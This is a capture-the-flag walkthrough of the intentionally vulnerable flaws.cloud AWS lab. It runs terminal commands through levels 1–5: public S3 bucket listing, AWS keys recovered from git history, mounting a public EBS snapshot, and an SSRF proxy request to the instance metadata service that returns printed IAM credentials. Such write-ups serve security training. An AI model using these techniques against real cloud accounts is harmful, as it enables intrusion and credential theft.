# flaws.cloud
+ http://flaws.cloud/

<center>
<pre>
 .d888 888        d8888 888       888  .d8888b.
d88P"  888       d88888 888   o   888 d88P  Y88b
888    888      d88P888 888  d8b  888 Y88b.
888888 888     d88P 888 888 d888b 888  "Y888b.
888    888    d88P  888 888d88888b888     "Y88b.
888    888   d88P   888 88888P Y88888       "888
888    888  d8888888888 8888P   Y8888 Y88b  d88P
888    888 d88P     888 888P     Y888  "Y8888P"
</pre>
</center>


## Solutions
- [Level 1](https://github.com/h4md153v63n/CloudSec/blob/main/07_flAWS/01_flaws.cloud.md#level-1)
- [Level 2](https://github.com/h4md153v63n/CloudSec/blob/main/07_flAWS/01_flaws.cloud.md#level-2)
- [Level 3](https://github.com/h4md153v63n/CloudSec/blob/main/07_flAWS/01_flaws.cloud.md#level-3)
- [Level 4](https://github.com/h4md153v63n/CloudSec/blob/main/07_flAWS/01_flaws.cloud.md#level-4)
- [Level 5](https://github.com/h4md153v63n/CloudSec/blob/main/07_flAWS/01_flaws.cloud.md#level-5)
- [Level 6](https://github.com/h4md153v63n/CloudSec/blob/main/07_flAWS/01_flaws.cloud.md#level-6)


### Level 1:
Go: http://flaws.cloud/hint1.html

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $dig flaws.cloud

; <<>> DiG 9.16.42-Debian <<>> flaws.cloud
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 55957
;; flags: qr rd ra; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0
;; WARNING: Message has 8 extra bytes at end

;; QUESTION SECTION:
;flaws.cloud.			IN	A

;; ANSWER SECTION:
flaws.cloud.		5	IN	A	52.92.204.19
flaws.cloud.		5	IN	A	52.92.186.27
flaws.cloud.		5	IN	A	52.92.227.187
flaws.cloud.		5	IN	A	52.92.192.203
flaws.cloud.		5	IN	A	52.92.233.211
flaws.cloud.		5	IN	A	52.218.132.66
flaws.cloud.		5	IN	A	52.92.209.99
flaws.cloud.		5	IN	A	52.92.232.251

;; Query time: 160 msec
;; SERVER: 192.168.1.1#53(192.168.1.1)
;; WHEN: Tue Jun 04 13:19:21 IST 2024
;; MSG SIZE  rcvd: 165

┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $nslookup flaws.cloud
Server:		192.168.1.1
Address:	192.168.1.1#53

Non-authoritative answer:
Name:	flaws.cloud
Address: 52.218.168.146
Name:	flaws.cloud
Address: 52.218.236.122
Name:	flaws.cloud
Address: 52.92.163.83
Name:	flaws.cloud
Address: 52.92.185.59
Name:	flaws.cloud
Address: 52.92.185.251
Name:	flaws.cloud
Address: 52.92.203.3
Name:	flaws.cloud
Address: 52.92.207.99
Name:	flaws.cloud
Address: 52.218.153.90
** server can't find flaws.cloud: NOTIMP
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/ea24c754-1743-4832-9c9f-8de4cc23c69c)


```
┌─[✗]─[cwl@RedCloud]─[~/Desktop]
└──╼ $nslookup 52.218.168.146
146.168.218.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.

Authoritative answers can be found from:
218.52.in-addr.arpa	nameserver = pdns1.ultradns.net.
218.52.in-addr.arpa	nameserver = x2.amazonaws.com.
218.52.in-addr.arpa	nameserver = x4.amazonaws.org.
218.52.in-addr.arpa	nameserver = x1.amazonaws.com.
218.52.in-addr.arpa	nameserver = x3.amazonaws.org.
x1.amazonaws.com	internet address = 156.154.64.10
x2.amazonaws.com	internet address = 156.154.65.10
x3.amazonaws.org	internet address = 156.154.150.1
x4.amazonaws.org	internet address = 204.74.120.1
pdns1.ultradns.net	internet address = 204.74.108.1
pdns1.ultradns.net	has AAAA address 2001:502:f3ff::1
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/75269f94-1c21-4954-88cb-885ac590174e)

Check: http://flaws.cloud.s3-website-us-west-2.amazonaws.com/

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/72326507-b007-4ff5-83ea-38282c4590b6)

Visit: http://s3-us-west-2.amazonaws.com/flaws.cloud

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/fe0fe170-3a3c-402e-b2e8-f630d5b624e9)

Navigate: http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/f5dfa251-2694-44ec-92ea-da3c1d9927ee)


### Level 2:
Visit: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/

Configure AWS CLI with your Access Key and Secret Key:

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws configure
AWS Access Key ID [****************JYCT]: A******************6
AWS Secret Access Key [****************lflS]: t*******************************R
Default region name [us-east-2]: us-west-2
Default output format [None]: 

```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/260a7d24-a260-4cc3-95a0-83f1b878b27f)

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --region us-west-2 --recursive
2017-02-27 07:32:15      80751 everyone.png
2017-03-03 09:17:17       1433 hint1.html
2017-02-27 07:34:39       1035 hint2.html
2017-02-27 07:32:14       2786 index.html
2017-02-27 07:32:14         26 robots.txt
2017-02-27 07:32:15       1051 secret-e4443fc.html
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/36ae40e4-9db0-4774-a264-2fd2017ba1b1)

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
-<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; 
            border-width: 1px; border-style: solid;} 
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
    
<center>
<pre >
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>


Level 3 is at <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</a>
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/2d6a8059-6065-46c3-a731-d1df22d7d65b)

**Alternatively**, navigate to http://s3-us-west-2.amazonaws.com/level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/44ecbe2c-38c4-4797-a0cf-8631f9fd4f3a)


### Level 3:
Visit: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --recursive
2017-09-17 20:42:24         52 .git/COMMIT_EDITMSG
2017-09-17 20:42:24         23 .git/HEAD
2017-09-17 20:42:24        130 .git/config
2017-09-17 20:42:24         73 .git/description
2017-09-17 20:42:24        452 .git/hooks/applypatch-msg.sample
2017-09-17 20:42:24        896 .git/hooks/commit-msg.sample
2017-09-17 20:42:24        189 .git/hooks/post-update.sample
2017-09-17 20:42:24        398 .git/hooks/pre-applypatch.sample
2017-09-17 20:42:24       1704 .git/hooks/pre-commit.sample
2017-09-17 20:42:24       4898 .git/hooks/pre-rebase.sample
2017-09-17 20:42:24       1239 .git/hooks/prepare-commit-msg.sample
2017-09-17 20:42:24       3611 .git/hooks/update.sample
2017-09-17 20:42:24        600 .git/index
2017-09-17 20:42:24        240 .git/info/exclude
2017-09-17 20:42:24        359 .git/logs/HEAD
2017-09-17 20:42:24        359 .git/logs/refs/heads/master
2017-09-17 20:42:24        679 .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
2017-09-17 20:42:24        770 .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
2017-09-17 20:42:25        820 .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c
2017-09-17 20:42:25        245 .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
2017-09-17 20:42:25     112013 .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
2017-09-17 20:42:25        560 .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
2017-09-17 20:42:25        191 .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
2017-09-17 20:42:25         42 .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526
2017-09-17 20:42:25        904 .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
2017-09-17 20:42:25         98 .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
2017-09-17 20:42:25        279 .git/objects/f2/a144957997f15729d4491f251c3615d508b16a
2017-09-17 20:42:25        125 .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
2017-09-17 20:42:25         41 .git/refs/heads/master
2017-02-27 05:44:33     123637 authenticated_users.png
2017-02-27 05:44:34       1552 hint1.html
2017-02-27 05:44:34       1426 hint2.html
2017-02-27 05:44:35       1247 hint3.html
2017-02-27 05:44:33       1035 hint4.html
2020-05-22 23:51:10       1861 index.html
2017-02-27 05:44:33         26 robots.txt
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/4cc84726-1e94-4559-9706-d906eeaa68fa)

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ./level3 --recursive
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-rebase.sample to level3/.git/hooks/pre-rebase.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/prepare-commit-msg.sample to level3/.git/hooks/prepare-commit-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/update.sample to level3/.git/hooks/update.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/index to level3/.git/index
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/info/exclude to level3/.git/info/exclude
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/HEAD to level3/.git/logs/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df to level3/.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25 to level3/.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b to level3/.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c to level3/.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 to level3/.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2 to level3/.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2 to level3/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526 to level3/.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/refs/heads/master to level3/.git/logs/refs/heads/master
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c to level3/.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to level3/authenticated_users.png
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html to level3/hint1.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to level3/.git/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to level3/.git/COMMIT_EDITMSG
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/description to level3/.git/description
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/commit-msg.sample to level3/.git/hooks/commit-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-applypatch.sample to level3/.git/hooks/pre-applypatch.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-commit.sample to level3/.git/hooks/pre-commit.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to level3/.git/hooks/post-update.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint3.html to level3/hint3.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/applypatch-msg.sample to level3/.git/hooks/applypatch-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/config to level3/.git/config
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint4.html to level3/hint4.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint2.html to level3/hint2.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/index.html to level3/index.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/robots.txt to level3/robots.txt
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/refs/heads/master to level3/.git/refs/heads/master
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f2/a144957997f15729d4491f251c3615d508b16a to level3/.git/objects/f2/a144957997f15729d4491f251c3615d508b16a
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61 to level3/.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c to level3/.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/6c755556-0a27-4f22-815a-9c61ed112844)

```
┌─[cwl@RedCloud]─[~/Desktop/level3]
└──╼ $ls -la
total 148
drwxr-xr-x 1 cwl cwl    174 Jun  4 15:41 .
drwxr-xr-x 1 cwl cwl    108 Jun  4 15:28 ..
-rw-r--r-- 1 cwl cwl 123637 Feb 27  2017 authenticated_users.png
drwxr-xr-x 1 cwl cwl    128 Jun  4 16:04 .git
-rw-r--r-- 1 cwl cwl   1552 Feb 27  2017 hint1.html
-rw-r--r-- 1 cwl cwl   1426 Feb 27  2017 hint2.html
-rw-r--r-- 1 cwl cwl   1247 Feb 27  2017 hint3.html
-rw-r--r-- 1 cwl cwl   1035 Feb 27  2017 hint4.html
-rw-r--r-- 1 cwl cwl   1861 May 22  2020 index.html
-rw-r--r-- 1 cwl cwl     26 Feb 27  2017 robots.txt
┌─[cwl@RedCloud]─[~/Desktop/level3]
└──╼ $git log 
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD, master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/7913c931-820d-4b41-98b5-87300f6ffe6f)

```
┌─[cwl@RedCloud]─[~/Desktop/level3]
└──╼ $git show
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD, master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

diff --git a/access_keys.txt b/access_keys.txt
deleted file mode 100644
index e3ae6dd..0000000
--- a/access_keys.txt
+++ /dev/null
@@ -1,2 +0,0 @@
-access_key AKIAJ366LIPB4IJKT7S A 
-secret_access_key OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jy s
```

```
┌─[cwl@RedCloud]─[~/Desktop/level3]
└──╼ $aws configure --profile level3
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7S A
AWS Secret Access Key [None]: OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jy s
Default region name [None]: us-west-2
Default output format [None]: 
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/0e61577a-6d5b-43ca-9871-d9741366d48c)

```
┌─[cwl@RedCloud]─[~/Desktop/level3]
└──╼ $aws s3 ls --profile level3
2020-06-25 23:13:56 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2020-06-27 04:36:07 config-bucket-975426262029
2020-06-27 16:16:15 flaws-logs
2020-06-27 16:16:15 flaws.cloud
2020-06-27 20:57:14 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2020-06-27 20:57:14 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2020-06-27 20:57:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2020-06-27 20:57:15 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2020-06-27 20:57:15 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2020-06-28 07:59:47 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

**Take note of the next buckets:**
```
2020-06-27 20:57:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2020-06-27 20:57:15 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2020-06-27 20:57:15 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2020-06-28 07:59:47 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```


### Level 4:
Visit: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud

```
┌─[cwl@RedCloud]─[~/Desktop/level3]
└──╼ $aws ec2 describe-instances --profile level3 | jq -r '.Reservations[].Instances[] | {VolumeId: (.BlockDeviceMappings[].Ebs.VolumeId), PublicIp: .PublicIpAddress}'
{
  "VolumeId": "vol-04f1c039bc13ea950",
  "PublicIp": "35.165.182.7"
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/7ec5e16c-e844-4908-8846-78b49980e532)

```
┌─[✗]─[cwl@RedCloud]─[~/Desktop/level3]
└──╼ $aws ec2 describe-snapshots --filters "Name=volume-id, Values=vol-04f1c039bc13ea950" --profile level3
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12.000Z",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/43633b3a-bbca-4369-851a-58591ffb8a07)

```
┌─[cwl@RedCloud]─[~/Desktop/level3]
└──╼ $aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile level3
{
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ],
    "SnapshotId": "snap-0b49342abd1bdcb89"
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/7b748ecc-2842-47bc-9fa4-c5ef95056738)

Anyone can create a volume based on this snapshot:

```
┌─[cwl@RedCloud]─[~/Desktop/level3]
└──╼ $aws ec2 create-volume --region us-west-2 --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89
{
    "AvailabilityZone": "us-west-2a",
    "CreateTime": "2024-06-04T11:30:43.000Z",
    "Encrypted": false,
    "Size": 8,
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "State": "creating",
    "VolumeId": "vol-0885a53d372e754a1",
    "Iops": 100,
    "Tags": [],
    "VolumeType": "gp2",
    "MultiAttachEnabled": false
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/d48b7e02-bd48-4b0a-9159-cb6228808216)

```
┌─[cwl@RedCloud]─[~/Desktop/level3]
└──╼ $aws ec2 describe-volumes
{
    "Volumes": [
        {
            "Attachments": [],
            "AvailabilityZone": "us-west-2a",
            "CreateTime": "2024-06-04T11:30:43.385Z",
            "Encrypted": false,
            "Size": 8,
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "State": "available",
            "VolumeId": "vol-0885a53d372e754a1",
            "Iops": 100,
            "VolumeType": "gp2",
            "MultiAttachEnabled": false
        }
    ]
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/40dc18ea-9302-477a-945b-d641a4bf4089)


Login https://console.aws.amazon.com/ with **your credentials on your aws cli**.

Create ec2 vm ubuntu instance with ssh .pem file on **your aws account**, and ssh into ubuntu from **your attack machine**:

**EC2 Dashboard** ---> **Launch instance** ---> Follow the next steps in the below screenshots:

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/3473a2a6-0973-4f36-b3b3-60ca4852dce4)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/cc8c5bb1-cde4-441c-aeda-5a859b99fac9)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/9b36f54e-173f-4ce9-a2e9-81a5f5f2ea04)

View instances **--->** choose instance **--->** click connect at the top **--->** follow instructions to SSH into the machine.

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/bda0dd5e-b311-4ed2-916b-e619a763d92f)

```
[cloudshell-user@ip-10-xxx-xx-xxx ~]$ aws ec2 describe-instances | jq -r '.Reservations[].Instances[].InstanceId'
i-0acc8a6d1886ebb03
[cloudshell-user@ip-10-xxx-xx-xxx ~]$ aws ec2 attach-volume --volume-id vol-0885a53d372e754a1 --instance-id i-0acc8a6d1886ebb03 --device /dev/sdz
{
    "AttachTime": "2024-06-04T14:49:54.112000+00:00",
    "Device": "/dev/sdz",
    "InstanceId": "i-0acc8a6d1886ebb03",
    "State": "attaching",
    "VolumeId": "vol-0885a53d372e754a1"
}
[cloudshell-user@ip-10-xxx-xx-xxx ~]$
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/c8d0c09b-f512-446e-be68-b5f03224b8a8)

SSH into the machine again from **your attack machine**, and list available drives with `lsblk`:

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/727695c9-03b5-47ed-9fdb-2e3b4212666b)

Mount the drive:

```
ubuntu@ip-172-31-27-89:~$ sudo mkdir /mnt/level4
ubuntu@ip-172-31-27-89:~$ sudo mount /dev/xvdz1 /mnt/level4
ubuntu@ip-172-31-27-89:~$ mount
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/fe2f381e-691e-482b-8f28-4a1b803f6aa5)

```
ubuntu@ip-172-31-27-89:~$ ls /mnt/level4/
bin   etc         initrd.img.old  lost+found  opt   run   srv  usr      vmlinuz.old
boot  home        lib             media       proc  sbin  sys  var
dev   initrd.img  lib64           mnt         root  snap  tmp  vmlinuz
ubuntu@ip-172-31-27-89:~$ cat /mnt/level4/etc/nginx/.htpasswd
flaws:$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0
ubuntu@ip-172-31-27-89:~$ ls /mnt/level4/home/ubuntu/
meta-data  setupNginx.sh
ubuntu@ip-172-31-27-89:~$ cat /mnt/level4/home/ubuntu/setupNginx.sh 
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
ubuntu@ip-172-31-27-89:~$ 
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/36d33428-f805-4018-a1bf-2dc59ac10599)

Visit: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/d8029822-f48f-4781-83cf-0eb189fe7437)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/2e2e49ba-2c57-4185-8e73-0545d15e4661)


### Level 5:
Visit: http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/

Try to access: http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/eee30939-c442-46fb-81d1-d06f1a8d9efc)

Navigate: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e2531bf1-a520-4e46-bba9-43fb497a10a7)

Then navigate: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/047bb707-a506-4e0b-8cd7-64f7c66ba919)

Check: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/c7ef491d-f6f0-428c-adc7-5380e44800b1)

IAM account name is **flaws**, and get credentials: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/a1bd95c1-c446-4cac-b7ed-720720e7da9b)

```
{
  "Code" : "Success",
  "LastUpdated" : "2024-06-04T20:29:23Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQG3HVVD76 Y",
  "SecretAccessKey" : "KEbQ8hY4gv5kqUxhJ43PbMvSTzMsX/4LaYThMQR 1",
  "Token" : "IQoJb3JpZ2luX2VjECUaCXVzLXdlc3QtMiJIMEYCIQDcPLruojywlrWbpzhbKwQy+THMF309OcJvcnERQNav6QIhAKqWln4+7HBI5mkIOMOsL8R+Yb1MHjVc73Wjv65aynJ8KrsFCK7//////////wEQBBoMOTc1NDI2MjYyMDI5Igx/MsX54m63o7gEISYqjwX636l2Jk0pVvJBZEU0qNTCtrw+CxE8ldm3dNP6Bm4lS89NGYCcLvlneeqNsGxraWtpoF/lNQEy1eJ1r91GCJAxYJlRNfd+F69g/R1RTweA4UooiSCERZgGlk8xcwzGyIH+wst4u0G7vJNpy0IDURy8dnnNuhn11/cxDUCcTB06fvYiRXDCeHxllAWzRmtJpJuhDETVvumgzcaSfBcoCZlIUi1npWRNE/9aX2C0JrvfnhbyLJDehUicH4sW2qb/phqNimh2juhpxbYBIkBCAXxrxFVnm0nE6/w7tds5Dn2ZAOcBXu0nhulBjyBHJINprkqVpyo91bZi4r7OaxUYRBNnWwdfpcUTLlHaNLnXaKgegTwJ7fnOdMEDHCFb8BCybBRAc7CiEiYT6RDD0tGE5c/RNy0p4jeODsKDe0hFSZi0C+ls+y/f3X+QmGWO1BFsoIkjzmCjdvdmZ/R2xAWzJPZnGM8D4fVxTJoD6zqj2g6W778n28hgoJucIr5Zboe4P9h9mA7IQ4PperDwKoszyCZU5vQs6Pnlf7Xp4FCDO/F/QpWu+BWJ1f6YmzBSVP9c0kX5jEiDTwOx/BZ2mNzaXfELhGTR/9kZJ/nLcnopPzpthH3Awu35aNFvAulGUM4uNb58aMyEs4qxohxGXn5Ahw6XIw9EoYqCNvQ8tsQ9P01MzcYTqwdv5/OGC3hGWNF27NKO0ZooAdr7+PqzhHN3OAcMcJfQz/oITPoucOrph1S5hdlOBKiE3np5b3sEhN8ShcupWpcaacNYCHjaax4BorauCw5qEg2wTLSefVLWbjvDzDN1c0XxeG8HZcHtMSgEWpgR+lUK7f43mwaUWltIM7ZXteB5Ffbqdq8LKS7UK7QoMJPy/bIGOrABatVLfDzRUkZLLBSHlmC/X28w+JZHGQ4PqKcwabQQtd2/4jbiLr/yfInrVRdx0bJxrIgiOpwtR3LHMlq8VchNN2SgI57fXXZLKIwEvo8gQramRS8fSY1g7dUhkz8h97GPRQ7lFY/I5AfybSaUb1y+tsKsXP8vXp3pahf30HAjTQmFb8OCSHZHF9gCWrJwdLOf7x7Iw85uEi0vLhNHBFilKjDc1bex2pPjGOyEIeSKNdk =",
  "Expiration" : "2024-06-05T02:38:15Z"
}
```


```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $nano ~/.aws/credentials
┌─[cwl@RedCloud]─[~/Desktop]
